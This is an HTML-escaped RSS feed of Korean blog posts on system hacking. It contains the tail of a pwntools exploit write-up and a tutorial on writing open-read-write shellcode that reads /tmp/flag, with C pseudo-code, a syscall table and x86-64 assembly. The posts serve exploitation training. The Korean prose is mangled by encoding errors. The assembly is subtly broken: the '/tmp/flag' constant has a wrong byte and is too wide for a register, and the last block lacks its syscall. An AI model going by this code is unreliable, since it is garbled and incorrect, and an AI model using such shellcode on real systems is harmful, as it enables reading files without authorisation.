&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë‚´ê°€ ì‘ì„±í•œ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¥¼ êµ³ì´ í˜ë“¤ê²Œ ì‰˜ì½”ë“œë¡œ ë³€í™˜í•  í•„ìš”ê°€ ì—†ì–´ì„œ íš¨ìœ¨ì ì´ë¼ ëŠë‚€ ì½”ë“œì˜€ë‹¤.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;4-ì•ìœ¼ë¡œ-ê³ ì¹ -ì &quot;&gt;4. ì•ìœ¼ë¡œ ê³ ì¹  ì &lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ì„ ë§Œë“¤ê³  ë‚˜ì„œ, ë¡œì»¬ í™˜ê²½ ëŒ€ìƒìœ¼ë¡œ gdbë¥¼ ëŒë ¤ë³¼ ê²ƒ.
    &lt;ul&gt;
      &lt;li&gt;ë¹„ìŠ·í•œ ê³¼ì •ì„ ë°˜ë³µí•  í•„ìš”ê°€ ì—†ìœ¼ë¯€ë¡œ ë¬¸ì œ í’€ì´ ì‹œê°„ì´ë‚˜ í”¼ë“œë°± ì‹œê°„ì´ í›¨ì”¬ ë‹¨ì¶•ë  ê²ƒì´ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ì›ê²© í™˜ê²½ì— ì…¸ì½”ë“œ ë“±ì˜ ë°”ì´ë„ˆë¦¬ë¥¼ ë³´ë‚¼ ë• ë°˜ë“œì‹œ pwntoolsì˜ send()ë¥¼ ì‚¬ìš©í•  ê²ƒ.
    &lt;ul&gt;
      &lt;li&gt;ì œë°œ ì œë°œ ì œë°œ ì§ì ‘ ì…ë ¥í•˜ì§€ ë§ê³  í”„ë¡œê·¸ë¨ì„ ì´ìš©í•˜ì.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Fri, 29 Jul 2022 00:08:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step4-2</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step4-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 4</title>
        <description>&lt;h1 id=&quot;stage-4&quot;&gt;STAGE 4&lt;/h1&gt;

&lt;h1 id=&quot;exploit-tech-shellcode&quot;&gt;Exploit Tech: ShellCode&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;ì‹œìŠ¤í…œ í•´í‚¹ì˜ ìµìŠ¤í”Œë¡œì‡ ê¸°ë²• ì²« ë²ˆì§¸: Shell Code&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;ì…¸ì½”ë“œ ê°œë…&lt;/li&gt;
    &lt;li&gt;orw(open-read-write, íŒŒì¼ ì½ê³  ì“°ê¸°) ì…¸ì½”ë“œ ì‘ì„± ë° ë””ë²„ê¹…&lt;/li&gt;
    &lt;li&gt;execve ì…¸ì½”ë“œ ì‘ì„±&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;ì…¸ì½”ë“œë€&quot;&gt;ì…¸ì½”ë“œë€?&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì œì‘ëœ ì–´ì…ˆë¸”ë¦¬ì–´ ì½”ë“œ ì¡°ê°&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;ì¼ë°˜ì ìœ¼ë¡œ ì…¸ì„ íšë“í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ì–´ì„œ â€œì…¸â€ì´ ë¶™ìŒ&lt;/li&gt;
    &lt;li&gt;ë˜í•œ ê·¸ë§Œí¼ ì…¸ íšë“ì€ ì‹œìŠ¤í…œ í•´í‚¹ì˜ ê´€ì ì—ì„œ ë§¤ìš° ì¤‘ìš”í•˜ë‹¤!&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;ì—¬ê¸°&lt;/a&gt;ì—ì„œ ì˜ˆì œë¥¼ í’€ë©´ì„œ í™•ì¸í–ˆë“¯, &lt;strong&gt;ripë¥¼ ë‚´ê°€ ì‹¤í–‰í•˜ê³  ì‹¶ì€ ì½”ë“œì˜ ì£¼ì†Œë¡œ ì˜®ê¸´ë‹¤ë©´ ì›í•˜ëŠ” ì½”ë“œê°€ ì‹¤í–‰ë˜ê²Œë” í•  ìˆ˜ ìˆë‹¤.&lt;/strong&gt; íŠ¹íˆ ì–´ì…ˆë¸”ë¦¬ì–´ëŠ” architecture dependencyê°€ ìˆìœ¼ë‚˜ ì¼ë‹¨ ì•Œë§ê²Œë§Œ ì‘ì„±í•œë‹¤ë©´ ê¸°ê³„ì–´ì™€ ë¬´ì¡°ê±´ í˜¸í™˜ë˜ë¯€ë¡œ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì‘ì„±í•œ ì½”ë“œëŠ” ì–´ì…ˆë¸”ë§Œ ê±°ì³ ê³§ì¥ CPUì˜ ë™ì‘ì— ì ìš©ëœë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ì…¸ì½”ë“œë¥¼ ì‘ì„±í•  ë•Œì˜ ì£¼ì˜ì‚¬í•­:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ ëŒ€ìƒ ì•„í‚¤í…ì²˜ì™€ ìš´ì˜ì²´ì œ, ê·¸ë¦¬ê³  ëª©ì ì„ ëª¨ë‘ ê³ ë ¤í•˜ë©° ì‘ì„±í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ì‹¤í–‰ë  ë‹¹ì‹œì˜ ë©”ëª¨ë¦¬ ìƒíƒœë¥¼ ì ì ˆíˆ ë°˜ì˜í•œë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;http://shell-storm.org/shellcode/&quot;&gt;ìì£¼ ì‚¬ìš©ë˜ëŠ” ì…¸ì½”ë“œê°€ ê³µìœ ëœ ì‚¬ì´íŠ¸&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ë²”ìš©ì ìœ¼ë¡œ ì‘ì„±ëœ ê²ƒì´ë¯€ë¡œ ì‹¤í–‰ ë‹¹ì‹œì˜ ë©”ëª¨ë¦¬ ìƒíƒœë¥¼ ë°˜ì˜í•˜ì§€ëŠ” ëª»í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ë”°ë¼ì„œ ì…¸ì½”ë“œëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì§ì ‘ ì‘ì„±í•´ì•¼ í•œë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;orw-ì…¸ì½”ë“œ&quot;&gt;orw ì…¸ì½”ë“œ&lt;/h1&gt;

&lt;p&gt;/tmp/flagë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” ì…¸ì½”ë“œ ì‘ì„±í•˜ê¸°&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;orw ì…¸ì½”ë“œ: open-read-write ì…¸ì½”ë“œì˜ ì¤€ë§ë¡œ, íŒŒì¼ì„ ì—´ì–´ì„œ ì½ì€ ë’¤ í™”ë©´ì— ì¶œë ¥í•´ ì£¼ëŠ” ì…¸ì½”ë“œì´ë‹¤.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;ì…¸ì½”ë“œëŠ” ë³´í†µ syscallì„ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì—, ì…¸ì½”ë“œ ì‘ì„± ì „ì— ì–´ë–¤ syscallì´ ìµìŠ¤í”Œë¡œì‡ì— í•„ìš”í•œì§€ ë¯¸ë¦¬ ìƒê°í•´ ë‘ë©´ ì¢‹ë‹¤.&lt;/li&gt;
    &lt;li&gt;êµ¬í˜„í•˜ê³  ì‹¶ì€ ì…¸ì½”ë“œë¥¼ pseudo-codeë¡œ ë¨¼ì € í‘œí˜„í•´ ë³´ì. ì•„ë¬´ í˜•ì‹ì´ì–´ë„ ê´œì°®ì§€ë§Œ ê³ ê¸‰ ì–¸ì–´ ì¤‘ì—ì„œë„ ë ˆë²¨ì´ ë‚®ì€ í¸ì¸ C ì–¸ì–´ í˜•ì‹ìœ¼ë¡œ í‘œí˜„í•˜ë©´ ì¡°ê¸ˆ ë” í¸í•˜ë‹¤.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//flag íŒŒì¼ì— ìˆëŠ” ê¸€ììˆ˜ë§Œí¼+1ì˜ ë²„í¼ ë§Œë“¤ì–´ ì£¼ê¸°&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RD_ONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ëª©í‘œ íŒŒì¼ì˜ í¬ì¸í„°ì™€ ì ‘ê·¼ ëª¨ë“œ ê°€ì ¸ì˜¤ê¸°&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// íŒŒì¼ì„ ì½ì–´ ì˜¤ê¸°&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1ë²ˆ, ì¦‰ stdoutì¸ ì½˜ì†”ì— ì½ì–´ ì˜¨ buf ì¶œë ¥í•˜ê¸°&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì—¬ê¸°ì—ì„œ ì‚¬ìš©ëœ syscallì€ ì´ ì„¸ ê°€ì§€, open, read, write ì˜€ë‹¤. í•´ë‹¹ syscallë“¤ì˜ ìƒì„¸ ì‚¬ì–‘ë“¤ì„ ì•Œì•„ë³´ì.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ì…¸ì½”ë“œ ì‘ì„±ì— í•„ìš”í•œ syscall ëª©ë¡&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0Â (rdi)&lt;/th&gt;
          &lt;th&gt;arg1Â (rsi)&lt;/th&gt;
          &lt;th&gt;arg2Â (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;read&lt;/td&gt;
          &lt;td&gt;0x00&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;write&lt;/td&gt;
          &lt;td&gt;0x01&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;const char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;open&lt;/td&gt;
          &lt;td&gt;0x02&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;int flags&lt;/td&gt;
          &lt;td&gt;umode_t mode&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ê´€ë ¨í•´ ê¸°ì–µë‚˜ëŠ” ê²Œ ìˆì„ ê²ƒì´ë‹¤â€¦ ê·¸ë ‡ë‹¤! &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step2-2/#/&quot;&gt;ì´ì „ í¬ìŠ¤íŒ…&lt;/a&gt;ì—ì„œ ì´ë¯¸ ë¹„ìŠ·í•œ ë‚´ìš©ì„ ë‹¤ë£¬ ì  ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;syscall ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì´ ì‹¤í–‰ë˜ë©´ CPUëŠ” raxë¶€í„° ì³ë‹¤ë³¸ë‹¤. syscall í…Œì´ë¸”ì˜ ì¸ë±ìŠ¤ì™€ rax ë‚´ë¶€ì˜ ê°’ì„ ëŒ€ì¡°í•´ ì§€ê¸ˆ ì‹¤í–‰í•˜ë ¤ëŠ” syscallì´ ì–´ë–¤ ì¢…ë¥˜ì¸ì§€ ì•Œê³  ì‹¶ì–´ì„œì´ë‹¤. ê·¸ ì´í›„ ìœ ì € ê¶Œí•œì—ì„œ ì‹œìŠ¤ì½œì„ ìš”ì²­í•œë‹¤ë©´ rdiâ†’rsiâ†’rdxâ†’rcxâ†’r8â†’r9â†’stack ì˜ ìˆœì„œë¡œ ë ˆì§€ìŠ¤í„°ë¥¼ í™•ì¸í•´ argumentsë¥¼ ê°€ì ¸ê°„ë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;ì…¸ì½”ë“œ-ì‘ì„±í•˜ê¸°&quot;&gt;ì…¸ì½”ë“œ ì‘ì„±í•˜ê¸°&lt;/h2&gt;

&lt;h3 id=&quot;1-int-fd--opentmpflag-o_rdonly-null&quot;&gt;1. int fd = open(â€/tmp/flagâ€, O_RDONLY, NULL)&lt;/h3&gt;

&lt;p&gt;ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œ ì½œ ì¤‘ open ì‹œìŠ¤í…œ ì½œì˜ ìš©ë²•ì€ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë¬¸ì„œë¥¼ ì½ì–´ ë³´ë‹ˆ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;flagsëŠ” ë°˜ë“œì‹œ access modesì¤‘ í•˜ë‚˜ë¥¼ ê°€ì§€ê³  ìˆì–´ì•¼ í–ˆë‹¤. access modesì˜ ì¢…ë¥˜ëŠ” ì•„ë˜ì™€ ê°™ë‹¤. í”Œë˜ê·¸ëŠ” ë¬¸ìì—´ì´ ì•„ë‹Œ ë°”ì´ë„ˆë¦¬ ê°’(ìˆ«ì)ë¡œ ë“¤ì–´ê°„ë‹¤ëŠ” ê²ƒì„ ì•Œê³  ìˆì!
    &lt;ul&gt;
      &lt;li&gt;O_RDONLY: read-only //0x00&lt;/li&gt;
      &lt;li&gt;O_WRONLY: write-only //0x01&lt;/li&gt;
      &lt;li&gt;O_RDWR: read/write //0x02&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mode_t mode&lt;/code&gt; íŒŒë¼ë¯¸í„°ëŠ” ë§Œì¼ ì—†ëŠ” íŒŒì¼ì„ ì°¸ì¡°í•  ë•Œ í”Œë˜ê·¸ì— O_CREATë‚˜ O_TMPFILEì´ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ íŒŒì¼ì„ ìƒˆë¡œ ë§Œë“œëŠ”ë°, ì´ ë•Œ ìƒˆë¡œ ë§Œë“¤ì–´ì§ˆ íŒŒì¼ì— ëŒ€í•œ ìœ ì €ì˜ ê¶Œí•œì„ ì •ì˜í•œë‹¤. ì—­ìœ¼ë¡œ ë§í•´ì„œ, ì•ì„œ ì–¸ê¸‰í•œ ë‘ í”Œë˜ê·¸ê°€ ì„¤ì •ë˜ì–´ ìˆì§€ ì•Šë‹¤ë©´ ë¬´ì‹œí•´ë„ ëœë‹¤. ë¬´ì‹œí•´ë„ ë˜ëŠ” ìƒí™©ì„ ë§Œë“¤ì–´ì„œ ì‹¤ì œë¡œ ë””ë²„ê±°ë¥¼ ì¼œì„œ í™•ì¸í•´ ë³´ë‹ˆ, mode argumentê°€ ë“¤ì–´ê°€ëŠ” rdxì— ì „í˜€ ì‹ ê²½ì“°ì§€ ì•ŠëŠ” ë™ì‘ì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ì¦‰ ìš°ë¦¬ëŠ” read-only ëª¨ë“œë¡œ ì•¡ì„¸ìŠ¤í•˜ê³  ì‹¶ìœ¼ë©° ë‹¤ë¥¸ í”Œë˜ê·¸ë¥¼ ì„¤ì •í•˜ì§€ ì•Šì„ ê²ƒì´ë¯€ë¡œ&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int open(const char *pathname, int flags);&lt;/code&gt; í˜•íƒœë¡œ ì‹œìŠ¤ì½œì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;syscall ì–´ì…ˆë¸”ë¦¬ì–´ê°€ ì‹¤í–‰ë  ë•Œ raxì—ëŠ” 0x02, rdiì—ëŠ” â€œ/tmp/flagâ€ë¼ëŠ” ë¬¸ìì—´(ì—”ë””ì•ˆ ê³ ë ¤)ì˜ ì‹œì‘ ì£¼ì†Œ(ë¬¸ìì—´ì€ ë³´í†µ ì‹œì‘ ì£¼ì†Œ í¬ì¸í„°ë¡œ ì ‘ê·¼í•˜ë¯€ë¡œ), rsiì—ëŠ” O_RDONLYì˜ ê³ ìœ ê°’ì¸ 0x00ì´ ë“¤ì–´ê°€ ìˆì–´ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;p&gt;ë˜í•œ ìŠ¤íƒì—ëŠ” í° ì£¼ì†Œë¶€í„° ì°¨ê³¡ì°¨ê³¡ ì‘ì€ ì£¼ì†Œë¡œ ë°ì´í„°ê°€ ì…ë ¥ëœë‹¤. &lt;del&gt;ìŠ¤íŠ¸ë§ ë°ì´í„°ë¥¼ ë„£ëŠ” ê²ƒì´ë¯€ë¡œ ì—”ë””ì–¸ì„ ê³ ë ¤í•  í•„ìš” ì—†ë‹¤.(ì´ê±´ ë‚´ ì¶”ì¸¡)&lt;/del&gt; ì¦‰ ì´ë¥¼ ê³ ë ¤í•˜ë©´ â€œ/tmp/flagâ€ë¥¼ ìŠ¤íƒì— ë„£ì–´ì¤˜ì•¼ í•˜ê³ , ì´ ê°’ì„ ì•„ìŠ¤í‚¤ ì½”ë“œì˜ hexë¡œ ë³€í™˜í–ˆì„ ë•Œ ì•„ë˜ì™€ ê°™ì€ ê°’ì´ ë‚˜ì˜¨ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x67616c662f705d742f&lt;/code&gt; = galf/pmt/&lt;/p&gt;

&lt;p&gt;ì´ì œê¹Œì§€ ë„ì¶œí•œ ì •ë³´ë¥¼ ì •ë¦¬í•´ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ í‘œí˜„í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rax, 0x02 ; syscall:open
mov r8, 0x67616c662f705d742f
push r8
mov rdi, rsp ; start address of &quot;/tmp/flag&quot;
xor rsi, rsi ; rsi=0, O_RDONLY
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;2-readfd-buf-0x30&quot;&gt;2. read(fd, buf, 0x30)&lt;/h3&gt;

&lt;p&gt;open() ì‹œìŠ¤ì½œì€ file descripterë¥¼ ë¦¬í„´í•œë‹¤. ì´ file descripterëŠ” ì–‘ì˜ ì •ìˆ˜ë¡œ íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” í…Œì´ë¸”ì˜ ì¸ë±ìŠ¤ì´ë‹¤. ìì„¸í•œ ë‚´ìš©ì€ ë¦¬ëˆ…ìŠ¤ì˜ íŒŒì¼ ì‹œìŠ¤í…œì„ ê³µë¶€í•˜ë©´ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;fd: ì‹œìŠ¤ì½œì˜ ë¦¬í„´ê°’ì€ raxì— ì €ì¥ë˜ë¯€ë¡œ, readë¥¼ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ì•ì„œ ì •ì˜í•œ ì–´ì…ˆë¸”ë¦¬ì–´ë¥¼ ìˆ˜í–‰í•œ ì§í›„ raxì˜ ê°’ì— ì ‘ê·¼í•´ì•¼ í•œë‹¤. ì¦‰, raxì˜ ê°’ì„ ì‚´ë¦¬ê¸° ìœ„í•´ read()ì˜ argumentsì¤‘ ì²«ë²ˆì§¸ì¸ fdê°€ ì €ì¥ë˜ëŠ” rdiì— raxë¥¼ ë¯¸ë¦¬ ë„£ì–´ë‘ê³  ë™ì‘ì„ ì§€ì‹œí•´ì•¼ í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;buf: ì´ëŠ” í”„ë¡œê·¸ë¨ì˜ í•¨ìˆ˜ ë‚´ì—ì„œ ì„ ì–¸ëœ ì§€ì—­ ë³€ìˆ˜ì´ê¸° ë•Œë¬¸ì— ìŠ¤íƒì— ìë¦¬ë¥¼ ë§Œë“œëŠ” ê²ƒì´ ì‘ë‹¹í•˜ë‹¤. ë”°ë¼ì„œ ìŠ¤íƒì— 0x30ë§Œí¼ì˜ ìë¦¬ë¥¼ í™•ë³´í•´ ì¤€ë‹¤. ì¦‰, [rsp-0x30]ì„ í•´ë‹¹ ë²„í¼ì˜ ì‹œì‘ ì£¼ì†Œë¡œ ì§€ì •í•´ ì£¼ë©´ ëœë‹¤(ìŠ¤íƒì€ í° ì£¼ì†Œì—ì„œ ì‘ì€ ì£¼ì†Œë¡œ ìë¼ë‚˜ê¸° ë•Œë¬¸ì—, ìŠ¤íƒì˜ ê¼­ëŒ€ê¸°ì¸ rspê°€ ê°€ë¦¬í‚¤ëŠ” ê³³ì—ì„œ 0x30ë§Œí¼ ì‘ì•„ì§„ ê³³ì´ë¼ë©´ ìŠ¤íƒì˜ ë°ì´í„°ë¥¼ ë§ì¹˜ì§€ ì•ŠëŠ” ê³³ì— ê³µê°„ì„ í™•ë³´í•œ ê²ƒì´ ëœë‹¤). ê·¸ì— ë§ê²Œ ë‘ë²ˆì§¸ arguementê°€ ì €ì¥ë˜ëŠ” rsiì— [rsp-0x30]ì„ ë„£ì–´ì£¼ë©´ ëœë‹¤.&lt;/li&gt;
  &lt;li&gt;0x30: íŒŒì¼ì—ì„œ ì½ì–´ë‚¼ ê¸¸ì´ì´ë©°, ì„¸ë²ˆì§¸ argumentì´ë¯€ë¡œ rdxì— ê·¸ ê°’ì„ ì €ì¥í•œë‹¤. ì´ ê²½ìš°ì—ëŠ” rdxì— 0x30ì„ ë„£ì–´ì£¼ë©´ ëœë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;raxì— ìˆë˜ ë¦¬í„´ê°’ì„ ì €ì¥í•œ ì´í›„ read syscallì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ raxë¥¼ 0x00ìœ¼ë¡œ ì„¤ì •í•´ ì¤€ë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ì •ë³´ë¥¼ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì •ë¦¬í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rdi, rax
lea rsi, [rsp-0x30] // == mov rsi, rsp  -&amp;gt;  sub rsi, 0x30 //  mov rsi, [rsp-0x30] : ì´ê²Œ ê°€ëŠ¥í•œ ì´ìœ ëŠ” rspì™€ rbpê°€ ìŠ¤íƒì˜ ëê³¼ ì‹œì‘ì„ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°ì´ê¸° ë•Œë¬¸ì´ë‹¤. 
// ì¦‰, ë ˆì§€ìŠ¤í„° ë‚´ë¶€ì— ìˆëŠ” ê°’ì´ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œê°€ ë°”ë¡œ ìŠ¤íƒì˜ ì‹œì‘ê³¼ ëì´ë‹¤. ë ˆì§€ìŠ¤í„°ì— ìˆëŠ” ê°’ì„ ë³€ê²½í•˜ë©´ ë°”ë¡œ ìŠ¤íƒì˜ ì‹œì‘ê³¼ ëì„ ê¸°ì¤€ìœ¼ë¡œ ì´ë™í•œ ìœ„ì¹˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.
mov rdx, 0x30
mov rax, 0x00
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;3-write1-buf-0x30&quot;&gt;3. write(1, buf, 0x30)&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;ì²« ë²ˆì§¸ argumentì¸ ì¶œë ¥ ìœ„ì¹˜ëŠ” rdië¥¼ ì°¸ì¡°í•˜ë¯€ë¡œ rdië¥¼ 0x01ë¡œ ì§€ì •í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ë‘ë²ˆì§¸ argumentì¸ bufì˜ ì‹œì‘ì£¼ì†ŒëŠ” rsië¥¼ ì°¸ì¡°í•˜ë¯€ë¡œ rsië¥¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; ë¡œ ì§€ì •í•´ ì¤€ë‹¤. (2ë²ˆ ê³¼ì •ì—ì„œ ì´ë¯¸ rspë¥¼ ì›í•˜ëŠ” ëŒ€ë¡œ ë³€ê²½í•´ ì¤¬ê¸° ë•Œë¬¸ì´ë‹¤)&lt;/li&gt;
  &lt;li&gt;ì„¸ë²ˆì§¸ argument, ì“¸ ë°ì´í„°ì˜ ê¸¸ì´ì¸ 0x30ì€ rdxì— ì €ì¥ë˜ë¯€ë¡œ rdxì— 0x30ì„ ë„£ì–´ì¤€ë‹¤.&lt;/li&gt;
  &lt;li&gt;write syscallì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ raxë¥¼ 0x01ë¡œ ì„¤ì •í•´ ì¤€ë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ì´ ì •ë³´ë¥¼ ì–´ì…ˆë¸”ë¦¬ì–´ë¡œ ì •ë¦¬í•˜ë©´ ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;mov rdi, 0x01
lea rsi, [rsp-0x30]
mov rdx, 0x30
mov rax, 0x01
&lt;/code&gt;&lt;/pre&gt;

